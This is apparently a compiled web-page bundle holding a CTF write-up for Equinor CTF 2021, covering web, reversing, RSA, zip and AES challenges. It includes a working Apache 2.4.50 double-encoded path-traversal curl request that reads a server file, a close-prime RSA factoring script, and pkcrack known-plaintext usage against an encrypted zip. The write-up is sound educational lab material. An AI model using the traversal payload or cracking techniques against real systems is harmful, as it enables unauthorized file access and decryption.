import{S as Pi,i as qi,s as Ci,C as qr,l as r,w as Ti,m as s,n as i,h as a,x as Oi,H as Cr,p,b as c,J as t,y as Ai,z as Di,A as Qs,f as zi,t as Si,B as Li,V as Zs,r as l,a as f,u as o,c as h,E as Ri}from"../../chunks/index-a24079f7.js";import{L as Fi}from"../../chunks/layout-c3125ff1.js";function Hi(Te){let u,q,L,b,C,oe,W,d,_,Oe,Ye,$a,Ka,Ma,Qe,Ba,Va,Ae,Ga,Ze,ja,Wa,De,Na,R,Ya,jt,ze,Qa,Wt,re,Xs=`<code class="language-sh">$ curl -i http://io.ept.gg:30071
HTTP/1.1 200 OK
Date: Sun, 31 Oct 2021 19:01:49 GMT
Server: Apache/2.4.50 (Unix)
Last-Modified: Mon, 11 Jun 2007 18:53:14 GMT
ETag: &quot;2d-432a5e4a73a80&quot;
Accept-Ranges: bytes
Content-Length: 45
Content-Type: text/html

&lt;html&gt;&lt;body&gt;&lt;h1&gt;It works!&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;</code>`,Nt,x,Za,F,Ja,Xa,Je,el,tl,Xe,al,ll,et,ol,rl,tt,sl,il,at,nl,cl,lt,pl,fl,Yt,O,hl,ot,dl,ul,rt,xl,_l,Qt,se,ei=`<code class="language-sh">$ curl --path-as-is -g &#39;http://io.ept.gg:30071/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/opt/flag&#39;
EPT&#123;we&#39;ve_got_a_blackhawk_down_we&#39;ve_got_a_blackhawk_down_i_mean_apache&#125;</code>`,Zt,ie,bl,st,ml,Jt,ne,Se,gl,Xt,w,it,vl,wl,nt,El,yl,ct,kl,Pl,Le,ql,H,Cl,ea,N,Tl,pt,Ol,Al,ta,ce,ti=`<code class="language-shell">$ <span class="token function">file</span> baby2
baby2: ELF <span class="token number">64</span>-bit LSB shared object, x86-64, version <span class="token number">1</span> <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span class="token punctuation">[</span>sha1<span class="token punctuation">]</span><span class="token operator">=</span>b9f51ccb036ad488285d75900e8dbba1e69e09f2, <span class="token keyword">for</span> GNU/Linux <span class="token number">3.2</span>.0, not stripped</code>`,aa,Re,Dl,la,pe,ai=`<code class="language-shell">$ <span class="token function">chmod</span> +x baby2
$ ./baby2
Enter the flag: EPT<span class="token punctuation">&#123;</span>flag_pl0x<span class="token punctuation">&#125;</span>
Sorry, flag is not correct :/</code>`,oa,Fe,zl,ra,fe,li=`<code class="language-c=">undefined8 main(void)

&#123;
  int iVar1;
  size_t sVar2;
  long in_FS_OFFSET;
  char local_48 [56];
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf(&quot;%s&quot;,&quot;Enter the flag: &quot;);
  fgets(local_48,0x32,stdin);
  sVar2 = strcspn(local_48,&quot;&#92;n&quot;);
  local_48[sVar2] = &#39;\0&#39;;
  iVar1 = checkFlag(local_48);
  if (iVar1 == 0) &#123;
    puts(&quot;Sorry, flag is not correct :/&quot;);
  &#125;
  else &#123;
    puts(&quot;Well done, that is correct!&quot;);
  &#125;
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) &#123;
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  &#125;
  return 0;
&#125;</code>`,sa,He,Sl,ia,he,oi=`<code class="language-c=">undefined8 checkFlag(long param_1)

&#123;
  size_t sVar1;
  uint local_10;

  sVar1 = strlen(flag);
  local_10 = 0;
  while( true ) &#123;
    if ((int)sVar1 &lt;= (int)local_10) &#123;
      return 1;
    &#125;
    if (((local_10 - ((int)local_10 &gt;&gt; 0x1f) &amp; 1) + ((int)local_10 &gt;&gt; 0x1f) == 1) &amp;&amp;
       ((*(byte *)(param_1 + (int)local_10) ^ 0x37) != flag[(int)local_10])) break;
    if (((local_10 &amp; 1) == 0) &amp;&amp;
       ((*(byte *)(param_1 + (int)local_10) ^ 0x13) != flag[(int)local_10])) &#123;
      return 0;
    &#125;
    local_10 = local_10 + 1;
  &#125;
  return 0;
&#125;</code>`,na,de,ft,Tr,ca,ue,ri=`<code class="language-python=">c = &quot;5667474c6b07616867584c43765f4c5a23072307230723077d166e&quot;
c = bytes.fromhex(c)
flag = &quot;&quot;
for i in range(len(c)):
    char = c[i]
    if i % 2 == 1:
        flag += chr(char^0x37)
    else:
        flag += chr(char^0x13)
print(flag) # EPT&#123;x0r_to_teh_m00000000n!&#125;</code>`,pa,xe,Ll,ht,Rl,fa,_e,Ie,Fl,ha,A,dt,Hl,Il,ut,Ul,$l,Y,Kl,I,Ml,Bl,U,Vl,da,E,Gl,xt,jl,Wl,_t,Nl,Yl,bt,Ql,Zl,ua,be,si=`<code class="language-python3=">from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from sympy import randprime, nextprime, invert

p = randprime(2**1023, 2**1024)
q = nextprime(p)
n = p * q
e = 65537
phi = (p-1)*(q-1)
d = int(invert(e, phi))
key = RSA.construct((n, e, d, p, q))
rsa = PKCS1_OAEP.new(key)
print(n)
print(rsa.encrypt(open(&#39;./flag.txt&#39;, &#39;rb&#39;).read()))</code>`,xa,me,ii=`<code class="language-undefined">13170168669036673658789415835821860466913191064101534501779274940690742604281448647173671946400157617199838272310601920602142822774113607705996734952326957290215951537099625639427739047605224303952391610020730760816940205220160216771511419133822833718461981026872830323755731912443015969055035169814519489784526129811052288823469079931979611710076056973923037676007513769049838507897490490814829478688852449121000733730837518239278607078752774705826529888903312298568894804438251828413144707077871047124974876546688478973141243880671642440976847597210524941636796956020071417167383875898209056473829391281999028768027
b&#39;$\xCD\0=\xD8\xE7&quot;w\x92\xF4\xD4_D\xE4\xBA\ve\xC3\x07\xD9/;\xCFD\xE4UE\xCB\x81\xFB\xD8\xE7\x98\xA1w\xC9#\x84\xCFV\xF6\x8AZ\xAD\xEE+Z\xB3Kp\xD3]1\xB9l\xA6R\xA0uK\xBEbtY\xE3Y\xDAn\x99\x8D5&#125;\xBAi\xD2ss&amp;\xB4h:U\xE4\xF8\b\xFC)\xFEP\f\xA8tq\xD0Y\xD1\x81\xD5\xA2P\xCF\xCD\xEE\xB9X&lt;1\xAA\xCB\x89\x88\xABj\xFC\xEC:\xC11\xF3\xC5\xB4&quot;\xA5jy\x9F\x8C\xA0r\xB8\xBCu\x07\xDA\xA3\xEBt\\w\xA7\xC4x\xE6G\xF3\xC3\x84\xC0U22\xA3a\x80S\x7F&gt;&#125;\xE9\xCD\x97\xE6\x8E\xF8\xF5\x88\x97\xAB\x1B\x1B\xBE7&#39;\x90P\xBC&#39; \xF2.\xCE\x89ua\xF6#3PU\xB3\xE5x\xFD\xBD\xF0\x86\xD8U\xD2m\xF8!\xC7\x99e\xDB\xEB\x86\xF4\x833&gt;\xC0\xA2\xDCk\x94\xD3\xBC-\xCC\xB6 \x96\xC4C&amp;\xAF\xCB\xB8.\xCEp&#39;</code>`,_a,v,Jl,mt,Xl,eo,gt,to,ao,vt,lo,oo,wt,ro,so,ba,m,io,Et,no,co,yt,po,fo,kt,ho,uo,Pt,xo,_o,qt,bo,mo,ma,ge,ni=`<code class="language-python=">from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from sympy import randprime, nextprime, invert
import gmpy2
from gmpy2 import mpz

e = 65537
n = mpz(13170168669036673658789415835821860466913191064101534501779274940690742604281448647173671946400157617199838272310601920602142822774113607705996734952326957290215951537099625639427739047605224303952391610020730760816940205220160216771511419133822833718461981026872830323755731912443015969055035169814519489784526129811052288823469079931979611710076056973923037676007513769049838507897490490814829478688852449121000733730837518239278607078752774705826529888903312298568894804438251828413144707077871047124974876546688478973141243880671642440976847597210524941636796956020071417167383875898209056473829391281999028768027)
flag = b&#39;$\xCD\0=\xD8\xE7&quot;w\x92\xF4\xD4_D\xE4\xBA\ve\xC3\x07\xD9/;\xCFD\xE4UE\xCB\x81\xFB\xD8\xE7\x98\xA1w\xC9#\x84\xCFV\xF6\x8AZ\xAD\xEE+Z\xB3Kp\xD3]1\xB9l\xA6R\xA0uK\xBEbtY\xE3Y\xDAn\x99\x8D5&#125;\xBAi\xD2ss&amp;\xB4h:U\xE4\xF8\b\xFC)\xFEP\f\xA8tq\xD0Y\xD1\x81\xD5\xA2P\xCF\xCD\xEE\xB9X&lt;1\xAA\xCB\x89\x88\xABj\xFC\xEC:\xC11\xF3\xC5\xB4&quot;\xA5jy\x9F\x8C\xA0r\xB8\xBCu\x07\xDA\xA3\xEBt\\w\xA7\xC4x\xE6G\xF3\xC3\x84\xC0U22\xA3a\x80S\x7F&gt;&#125;\xE9\xCD\x97\xE6\x8E\xF8\xF5\x88\x97\xAB\x1B\x1B\xBE7&#39;\x90P\xBC&#39; \xF2.\xCE\x89ua\xF6#3PU\xB3\xE5x\xFD\xBD\xF0\x86\xD8U\xD2m\xF8!\xC7\x99e\xDB\xEB\x86\xF4\x833&gt;\xC0\xA2\xDCk\x94\xD3\xBC-\xCC\xB6 \x96\xC4C&amp;\xAF\xCB\xB8.\xCEp&#39;
print(n)
print()

estimate = mpz(gmpy2.iroot(n, 2)[0])
prime = estimate
print(estimate)
for _ in range(10000):
    prime += 1
    if n%prime == 0:
        break
p = mpz(prime)
q = mpz(n // p)
assert(p*q == n)
print(&quot;p: &quot;, p)
print(&quot;q: &quot;, q)
phi = (p-1)*(q-1)
d = int(invert(e, phi))
key = RSA.construct((int(n), int(e), int(d), int(p), int(q)))
rsa = PKCS1_OAEP.new(key)
print(rsa.decrypt(flag)) # EPT&#123;5qrt_b3_sc4ry_owo&#125;</code>`,ga,ve,go,Ct,vo,va,we,Ue,wo,wa,y,Tt,Eo,yo,Ot,ko,Po,$e,qo,At,Or,Co,Ke,To,$,Oo,Ea,k,Ao,Dt,Do,zo,zt,So,Lo,St,Ro,Fo,ya,Ee,ci='<code class="language-undefined">This is a zip file that you will never be able to crack, the password has 39 characters. Go ahead and use johns/hashcats etc., if you have 1000 years to spare :)</code>',ka,Q,Ho,Lt,Io,Uo,Pa,D,$o,Rt,Ko,Mo,Ft,Bo,Vo,qa,T,Go,Ht,jo,Wo,K,No,Yo,M,Qo,Ca,Me,Zo,Ta,ye,pi=`<code class="language-shell">$ <span class="token function">ls</span>
hint.txt
$ <span class="token function">cat</span> hint.txt
This is a <span class="token function">zip</span> <span class="token function">file</span> that you will never be able to crack, the password has <span class="token number">39</span> characters. Go ahead and use johns/hashcats etc., <span class="token keyword">if</span> you have <span class="token number">1000</span> years to spare <span class="token builtin class-name">:</span><span class="token punctuation">)</span>
$ 7z a new.zip *</code>`,Oa,Be,Jo,Aa,ke,fi=`<code class="language-shell">$ <span class="token function">ls</span>
pkcrack challenge.zip new.zip
$ ./pkcrack -C challenge.zip -c <span class="token string">"hint.txt"</span> -P new.zip -p <span class="token string">"hint.txt"</span> -d decrypted.zip -a</code>`,Da,B,Xo,It,er,tr,Ut,ar,za,Pe,Ve,lr,Sa,z,$t,or,rr,Kt,sr,ir,Z,nr,V,cr,pr,G,fr,La,J,hr,j,dr,ur,Ra,qe,xr,Mt,_r;return{c(){u=r("p"),q=l("Heres a small writeup on the challenges I solved for Equinor CTF 2021 with team Corax :) I was quite busy the weekend of this CTF and didn\u2019t get to really enjoy the CTF throughly as much as I wanted. The challenges were pretty fun to work on together with the team nonetheless!"),L=f(),b=r("h2"),C=r("a"),oe=l("Beginner/AH-64"),W=f(),d=r("blockquote"),_=r("p"),Oe=l("Author: "),Ye=r("code"),$a=l("LOLASL"),Ka=l(`
33 solves / 335 points`),Ma=f(),Qe=r("p"),Ba=l("Category: Web"),Va=f(),Ae=r("p"),Ga=l("Super Six One, go to UHF secure. I\u2019ve got some bad news. > We see vulnerabilites like it is 2001. Tango located in "),Ze=r("code"),ja=l("/opt/flag"),Wa=f(),De=r("p"),Na=l("Site: "),R=r("a"),Ya=l("AH-64"),jt=f(),ze=r("p"),Qa=l("Since this is a web challenge, I begin by navigating to the site and sees a blank page with a text saying: \u201CIt works!\u201D"),Wt=f(),re=r("pre"),Nt=f(),x=r("p"),Za=l("However looking at the request headers, we see that the website runs on the apache server 2.4.50, which we know is still vulnerable to a Path-Traversal attack due to an error in how URL encoded paths are normalized.("),F=r("a"),Ja=l("https://httpd.apache.org/security/vulnerabilities_24.html"),Xa=l("). Apache version 2.4.50 is supposed to be a fix of 2.4.49 where "),Je=r("code"),el=l("%2e%2e"),tl=l(" was encoded to "),Xe=r("code"),al=l(".."),ll=l(", but the possibility of by double encoding was missed when one is not in the root directory: "),et=r("code"),ol=l("%%32%65"),rl=l(" -> "),tt=r("code"),sl=l("%2e"),il=l(" -> "),at=r("code"),nl=l("."),cl=l(". Utilizing this fact, we can access arbitrary files outside the site root directory by going to the previous directories through "),lt=r("code"),pl=l("../"),fl=l("."),Yt=f(),O=r("p"),hl=l("Knowing this, I started to fuzz for available directories and "),ot=r("code"),dl=l("cgi-bin"),ul=l(" was found, letting us easiliy curl for the flag at "),rt=r("code"),xl=l("/opt/flag"),_l=l(":"),Qt=f(),se=r("pre"),Zt=f(),ie=r("p"),bl=l("The flag is "),st=r("code"),ml=l("EPT{we've_got_a_blackhawk_down_we've_got_a_blackhawk_down_i_mean_apache}"),Jt=f(),ne=r("h2"),Se=r("a"),gl=l("Beginner/baby2"),Xt=f(),w=r("blockquote"),it=r("p"),vl=l(`Author: nordbo
25 solves / 384 points`),wl=f(),nt=r("p"),El=l("Category: Reversing"),yl=f(),ct=r("p"),kl=l("Can you figure it out?"),Pl=f(),Le=r("p"),ql=l(`Downloads
`),H=r("a"),Cl=l("baby2"),ea=f(),N=r("p"),Tl=l("Downloading the binary file "),pt=r("code"),Ol=l("baby2"),Al=l(" we see that it is an ELF binary file."),ta=f(),ce=r("pre"),aa=f(),Re=r("p"),Dl=l("Running the program, we can see that it is taking in a user input and checking if the input given is correct, returning either correct or incorrect."),la=f(),pe=r("pre"),oa=f(),Fe=r("p"),zl=l("After testing the program out, as any reversing challenges, I quickly boot up ghidra in hopes of disassembling the binary, making it easier to see what is happening in the background. As this is a beginner challenge, we get to easily see the disassembled code:"),ra=f(),fe=r("pre"),sa=f(),He=r("p"),Sl=l("Checking out the main function we see that the main logic is handled in line 15, seeing if the function checkFlag is returning true or false:"),ia=f(),he=r("pre"),na=f(),de=r("figure"),ft=r("img"),ca=f(),ue=r("pre"),pa=f(),xe=r("p"),Ll=l("Running the python script above gives us the flag: "),ht=r("code"),Rl=l("EPT{x0r_to_teh_m00000000n!}"),fa=f(),_e=r("h2"),Ie=r("a"),Fl=l("Crypto/Really Solid Algebra"),ha=f(),A=r("blockquote"),dt=r("p"),Hl=l(`Author: null
24 solves / 390 points`),Il=f(),ut=r("p"),Ul=l("Using all the latest math and crypto libraries, this new Really Solid Algebra system should be practically uncrackable!"),$l=f(),Y=r("p"),Kl=l(`Downloads
`),I=r("a"),Ml=l("rsa.py"),Bl=l(" > "),U=r("a"),Vl=l("output.log"),da=f(),E=r("p"),Gl=l("Opening "),xt=r("code"),jl=l("rsa.py"),Wl=l(" we are given the encryption code, and the "),_t=r("code"),Nl=l("output.log"),Yl=l(" contains the modulus "),bt=r("code"),Ql=l("n"),Zl=l(" and the ciphertext:"),ua=f(),be=r("pre"),xa=f(),me=r("pre"),_a=f(),v=r("p"),Jl=l("Observing the code, we can first see that there\u2019s something strange with the prime generation. The problem is that it doesn\u2019t generate two independent random primes as an RSA prime generation should. Instead it generates an independent random prime number "),mt=r("code"),Xl=l("p"),eo=l(" (from "),gt=r("code"),to=l("2^1023"),ao=l(" to "),vt=r("code"),lo=l("2^1024"),oo=l(" bits), then a the next prime q which is very close to p: "),wt=r("code"),ro=l("q = nextprime(p)"),so=l(" (meaning that q is generated dependent on p)."),ba=f(),m=r("p"),io=l("Looking at how "),Et=r("code"),no=l("p"),co=l(" and "),yt=r("code"),po=l("q"),fo=l(" is close to each other we can approximate a prime by taking the sqrt of "),kt=r("code"),ho=l("n"),uo=l(". Knowing the approximate p, and that it is not too far off the exact value of p, we can do a linear search for p by checking when the approximate p divides N (getting the exact prime factor of N), thus we can find both primes "),Pt=r("code"),xo=l("p"),_o=l(" and "),qt=r("code"),bo=l("q"),mo=l("."),ma=f(),ge=r("pre"),ga=f(),ve=r("p"),go=l("Running the script above gives us the flag: "),Ct=r("code"),vo=l("EPT{5qrt_b3_sc4ry_owo}"),va=f(),we=r("h2"),Ue=r("a"),wo=l("Misc/Uncrackable zip"),wa=f(),y=r("blockquote"),Tt=r("p"),Eo=l(`Author: vcpo
15 solves / 439 points`),yo=f(),Ot=r("p"),ko=l("Take a zip of my uncrackable drink."),Po=f(),$e=r("p"),qo=l(`Description
`),At=r("img"),Co=f(),Ke=r("p"),To=l(`Downloads
`),$=r("a"),Oo=l("challenge.zip"),Ea=f(),k=r("p"),Ao=l("Looking at the given image above, we can see that the zip file "),Dt=r("code"),Do=l("challenge.zip"),zo=l(" contains 2 files: "),zt=r("code"),So=l("flag.txt"),Lo=l(" and "),St=r("code"),Ro=l("hint.txt"),Fo=l(" (which we know the content of):"),ya=f(),Ee=r("pre"),ka=f(),Q=r("p"),Ho=l("Downloading the zip file "),Lt=r("code"),Io=l("challenge.zip"),Uo=l(" and trying to unzip it prompts us for a password, which we know isn\u2019t bruteforce able as it will take to long."),Pa=f(),D=r("p"),$o=l("After a quick google search we see that there\u2019s something called a "),Rt=r("code"),Ko=l("known plaintext attack"),Mo=l(", which means that one can break the cipher if one knows a part of the encrypted data. (which in this case, we do with "),Ft=r("code"),Bo=l("hint.txt"),Vo=l(")"),qa=f(),T=r("p"),Go=l("Luckily someone has already implemented the algorithm that was developed by Eli Biham and Paul Kocher on a "),Ht=r("code"),jo=l("known plaintext attack"),Wo=l(" on zip files described in "),K=r("a"),No=l("this paper (Postscript, 80k)"),Yo=l(` (I didn\u2019t read this however).
The program can be found here: `),M=r("a"),Qo=l("https://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack.html"),Ca=f(),Me=r("p"),Zo=l("With the implementation in box, solving this challenge has become just as easy as running the program:"),Ta=f(),ye=r("pre"),Oa=f(),Be=r("p"),Jo=l("and"),Aa=f(),ke=r("pre"),Da=f(),B=r("p"),Xo=l("Opening the decrypted zip file "),It=r("code"),er=l("decrypted.zip"),tr=l(" and we get the flag: "),Ut=r("code"),ar=l("EPT{d1d_y0u_gu3$$_th3_p4$$w0rd_0r_pl41nt3xt_cr4ck_1t?}"),za=f(),Pe=r("h2"),Ve=r("a"),lr=l("Crypto/Arbitrary Encoding System"),Sa=f(),z=r("blockquote"),$t=r("p"),or=l(`Author: null
20 solves / 413 points`),rr=f(),Kt=r("p"),sr=l("I heard that all the cool kids down the street had switched to this new cipher. Think it was called Arbitrary Encoding System or something\u2026"),ir=f(),Z=r("p"),nr=l(`Downloads
`),V=r("a"),cr=l("aes.py"),pr=l(" > "),G=r("a"),fr=l("flag.png.enc"),La=f(),J=r("p"),hr=l("Read this writeup for some good shit explanations: "),j=r("a"),dr=l("https://github.com/williamsolem/writeups/tree/main/EquinorCTF#arbitrary-encoding-system"),ur=l(". Thank you!"),Ra=f(),qe=r("p"),xr=l("The flag is: "),Mt=r("code"),_r=l("EPT{mode_of_operation_is_important}"),this.h()},l(e){u=s(e,"P",{});var n=i(u);q=o(n,"Heres a small writeup on the challenges I solved for Equinor CTF 2021 with team Corax :) I was quite busy the weekend of this CTF and didn\u2019t get to really enjoy the CTF throughly as much as I wanted. The challenges were pretty fun to work on together with the team nonetheless!"),n.forEach(a),L=h(e),b=s(e,"H2",{id:!0});var Ar=i(b);C=s(Ar,"A",{href:!0});var Dr=i(C);oe=o(Dr,"Beginner/AH-64"),Dr.forEach(a),Ar.forEach(a),W=h(e),d=s(e,"BLOCKQUOTE",{});var X=i(d);_=s(X,"P",{});var Fa=i(_);Oe=o(Fa,"Author: "),Ye=s(Fa,"CODE",{});var zr=i(Ye);$a=o(zr,"LOLASL"),zr.forEach(a),Ka=o(Fa,`
33 solves / 335 points`),Fa.forEach(a),Ma=h(X),Qe=s(X,"P",{});var Sr=i(Qe);Ba=o(Sr,"Category: Web"),Sr.forEach(a),Va=h(X),Ae=s(X,"P",{});var br=i(Ae);Ga=o(br,"Super Six One, go to UHF secure. I\u2019ve got some bad news. > We see vulnerabilites like it is 2001. Tango located in "),Ze=s(br,"CODE",{});var Lr=i(Ze);ja=o(Lr,"/opt/flag"),Lr.forEach(a),br.forEach(a),Wa=h(X),De=s(X,"P",{});var mr=i(De);Na=o(mr,"Site: "),R=s(mr,"A",{href:!0,rel:!0,class:!0,target:!0});var Rr=i(R);Ya=o(Rr,"AH-64"),Rr.forEach(a),mr.forEach(a),X.forEach(a),jt=h(e),ze=s(e,"P",{});var Fr=i(ze);Qa=o(Fr,"Since this is a web challenge, I begin by navigating to the site and sees a blank page with a text saying: \u201CIt works!\u201D"),Fr.forEach(a),Wt=h(e),re=s(e,"PRE",{class:!0});var hi=i(re);hi.forEach(a),Nt=h(e),x=s(e,"P",{});var g=i(x);Za=o(g,"However looking at the request headers, we see that the website runs on the apache server 2.4.50, which we know is still vulnerable to a Path-Traversal attack due to an error in how URL encoded paths are normalized.("),F=s(g,"A",{href:!0,rel:!0,class:!0,target:!0});var Hr=i(F);Ja=o(Hr,"https://httpd.apache.org/security/vulnerabilities_24.html"),Hr.forEach(a),Xa=o(g,"). Apache version 2.4.50 is supposed to be a fix of 2.4.49 where "),Je=s(g,"CODE",{});var Ir=i(Je);el=o(Ir,"%2e%2e"),Ir.forEach(a),tl=o(g," was encoded to "),Xe=s(g,"CODE",{});var Ur=i(Xe);al=o(Ur,".."),Ur.forEach(a),ll=o(g,", but the possibility of by double encoding was missed when one is not in the root directory: "),et=s(g,"CODE",{});var $r=i(et);ol=o($r,"%%32%65"),$r.forEach(a),rl=o(g," -> "),tt=s(g,"CODE",{});var Kr=i(tt);sl=o(Kr,"%2e"),Kr.forEach(a),il=o(g," -> "),at=s(g,"CODE",{});var Mr=i(at);nl=o(Mr,"."),Mr.forEach(a),cl=o(g,". Utilizing this fact, we can access arbitrary files outside the site root directory by going to the previous directories through "),lt=s(g,"CODE",{});var Br=i(lt);pl=o(Br,"../"),Br.forEach(a),fl=o(g,"."),g.forEach(a),Yt=h(e),O=s(e,"P",{});var Ge=i(O);hl=o(Ge,"Knowing this, I started to fuzz for available directories and "),ot=s(Ge,"CODE",{});var Vr=i(ot);dl=o(Vr,"cgi-bin"),Vr.forEach(a),ul=o(Ge," was found, letting us easiliy curl for the flag at "),rt=s(Ge,"CODE",{});var Gr=i(rt);xl=o(Gr,"/opt/flag"),Gr.forEach(a),_l=o(Ge,":"),Ge.forEach(a),Qt=h(e),se=s(e,"PRE",{class:!0});var di=i(se);di.forEach(a),Zt=h(e),ie=s(e,"P",{});var gr=i(ie);bl=o(gr,"The flag is "),st=s(gr,"CODE",{});var jr=i(st);ml=o(jr,"EPT{we've_got_a_blackhawk_down_we've_got_a_blackhawk_down_i_mean_apache}"),jr.forEach(a),gr.forEach(a),Jt=h(e),ne=s(e,"H2",{id:!0});var Wr=i(ne);Se=s(Wr,"A",{href:!0});var Nr=i(Se);gl=o(Nr,"Beginner/baby2"),Nr.forEach(a),Wr.forEach(a),Xt=h(e),w=s(e,"BLOCKQUOTE",{});var ee=i(w);it=s(ee,"P",{});var Yr=i(it);vl=o(Yr,`Author: nordbo
25 solves / 384 points`),Yr.forEach(a),wl=h(ee),nt=s(ee,"P",{});var Qr=i(nt);El=o(Qr,"Category: Reversing"),Qr.forEach(a),yl=h(ee),ct=s(ee,"P",{});var Zr=i(ct);kl=o(Zr,"Can you figure it out?"),Zr.forEach(a),Pl=h(ee),Le=s(ee,"P",{});var vr=i(Le);ql=o(vr,`Downloads
`),H=s(vr,"A",{href:!0,rel:!0,class:!0,target:!0});var Jr=i(H);Cl=o(Jr,"baby2"),Jr.forEach(a),vr.forEach(a),ee.forEach(a),ea=h(e),N=s(e,"P",{});var Ha=i(N);Tl=o(Ha,"Downloading the binary file "),pt=s(Ha,"CODE",{});var Xr=i(pt);Ol=o(Xr,"baby2"),Xr.forEach(a),Al=o(Ha," we see that it is an ELF binary file."),Ha.forEach(a),ta=h(e),ce=s(e,"PRE",{class:!0});var ui=i(ce);ui.forEach(a),aa=h(e),Re=s(e,"P",{});var es=i(Re);Dl=o(es,"Running the program, we can see that it is taking in a user input and checking if the input given is correct, returning either correct or incorrect."),es.forEach(a),la=h(e),pe=s(e,"PRE",{class:!0});var xi=i(pe);xi.forEach(a),oa=h(e),Fe=s(e,"P",{});var ts=i(Fe);zl=o(ts,"After testing the program out, as any reversing challenges, I quickly boot up ghidra in hopes of disassembling the binary, making it easier to see what is happening in the background. As this is a beginner challenge, we get to easily see the disassembled code:"),ts.forEach(a),ra=h(e),fe=s(e,"PRE",{class:!0});var _i=i(fe);_i.forEach(a),sa=h(e),He=s(e,"P",{});var as=i(He);Sl=o(as,"Checking out the main function we see that the main logic is handled in line 15, seeing if the function checkFlag is returning true or false:"),as.forEach(a),ia=h(e),he=s(e,"PRE",{class:!0});var bi=i(he);bi.forEach(a),na=h(e),de=s(e,"FIGURE",{class:!0});var ls=i(de);ft=s(ls,"IMG",{src:!0}),ls.forEach(a),ca=h(e),ue=s(e,"PRE",{class:!0});var mi=i(ue);mi.forEach(a),pa=h(e),xe=s(e,"P",{});var wr=i(xe);Ll=o(wr,"Running the python script above gives us the flag: "),ht=s(wr,"CODE",{});var os=i(ht);Rl=o(os,"EPT{x0r_to_teh_m00000000n!}"),os.forEach(a),wr.forEach(a),fa=h(e),_e=s(e,"H2",{id:!0});var rs=i(_e);Ie=s(rs,"A",{href:!0});var ss=i(Ie);Fl=o(ss,"Crypto/Really Solid Algebra"),ss.forEach(a),rs.forEach(a),ha=h(e),A=s(e,"BLOCKQUOTE",{});var je=i(A);dt=s(je,"P",{});var is=i(dt);Hl=o(is,`Author: null
24 solves / 390 points`),is.forEach(a),Il=h(je),ut=s(je,"P",{});var ns=i(ut);Ul=o(ns,"Using all the latest math and crypto libraries, this new Really Solid Algebra system should be practically uncrackable!"),ns.forEach(a),$l=h(je),Y=s(je,"P",{});var Bt=i(Y);Kl=o(Bt,`Downloads
`),I=s(Bt,"A",{href:!0,rel:!0,class:!0,target:!0});var cs=i(I);Ml=o(cs,"rsa.py"),cs.forEach(a),Bl=o(Bt," > "),U=s(Bt,"A",{href:!0,rel:!0,class:!0,target:!0});var ps=i(U);Vl=o(ps,"output.log"),ps.forEach(a),Bt.forEach(a),je.forEach(a),da=h(e),E=s(e,"P",{});var te=i(E);Gl=o(te,"Opening "),xt=s(te,"CODE",{});var fs=i(xt);jl=o(fs,"rsa.py"),fs.forEach(a),Wl=o(te," we are given the encryption code, and the "),_t=s(te,"CODE",{});var hs=i(_t);Nl=o(hs,"output.log"),hs.forEach(a),Yl=o(te," contains the modulus "),bt=s(te,"CODE",{});var ds=i(bt);Ql=o(ds,"n"),ds.forEach(a),Zl=o(te," and the ciphertext:"),te.forEach(a),ua=h(e),be=s(e,"PRE",{class:!0});var gi=i(be);gi.forEach(a),xa=h(e),me=s(e,"PRE",{class:!0});var vi=i(me);vi.forEach(a),_a=h(e),v=s(e,"P",{});var S=i(v);Jl=o(S,"Observing the code, we can first see that there\u2019s something strange with the prime generation. The problem is that it doesn\u2019t generate two independent random primes as an RSA prime generation should. Instead it generates an independent random prime number "),mt=s(S,"CODE",{});var us=i(mt);Xl=o(us,"p"),us.forEach(a),eo=o(S," (from "),gt=s(S,"CODE",{});var xs=i(gt);to=o(xs,"2^1023"),xs.forEach(a),ao=o(S," to "),vt=s(S,"CODE",{});var _s=i(vt);lo=o(_s,"2^1024"),_s.forEach(a),oo=o(S," bits), then a the next prime q which is very close to p: "),wt=s(S,"CODE",{});var bs=i(wt);ro=o(bs,"q = nextprime(p)"),bs.forEach(a),so=o(S," (meaning that q is generated dependent on p)."),S.forEach(a),ba=h(e),m=s(e,"P",{});var P=i(m);io=o(P,"Looking at how "),Et=s(P,"CODE",{});var ms=i(Et);no=o(ms,"p"),ms.forEach(a),co=o(P," and "),yt=s(P,"CODE",{});var gs=i(yt);po=o(gs,"q"),gs.forEach(a),fo=o(P," is close to each other we can approximate a prime by taking the sqrt of "),kt=s(P,"CODE",{});var vs=i(kt);ho=o(vs,"n"),vs.forEach(a),uo=o(P,". Knowing the approximate p, and that it is not too far off the exact value of p, we can do a linear search for p by checking when the approximate p divides N (getting the exact prime factor of N), thus we can find both primes "),Pt=s(P,"CODE",{});var ws=i(Pt);xo=o(ws,"p"),ws.forEach(a),_o=o(P," and "),qt=s(P,"CODE",{});var Es=i(qt);bo=o(Es,"q"),Es.forEach(a),mo=o(P,"."),P.forEach(a),ma=h(e),ge=s(e,"PRE",{class:!0});var wi=i(ge);wi.forEach(a),ga=h(e),ve=s(e,"P",{});var Er=i(ve);go=o(Er,"Running the script above gives us the flag: "),Ct=s(Er,"CODE",{});var ys=i(Ct);vo=o(ys,"EPT{5qrt_b3_sc4ry_owo}"),ys.forEach(a),Er.forEach(a),va=h(e),we=s(e,"H2",{id:!0});var ks=i(we);Ue=s(ks,"A",{href:!0});var Ps=i(Ue);wo=o(Ps,"Misc/Uncrackable zip"),Ps.forEach(a),ks.forEach(a),wa=h(e),y=s(e,"BLOCKQUOTE",{});var ae=i(y);Tt=s(ae,"P",{});var qs=i(Tt);Eo=o(qs,`Author: vcpo
15 solves / 439 points`),qs.forEach(a),yo=h(ae),Ot=s(ae,"P",{});var Cs=i(Ot);ko=o(Cs,"Take a zip of my uncrackable drink."),Cs.forEach(a),Po=h(ae),$e=s(ae,"P",{});var yr=i($e);qo=o(yr,`Description
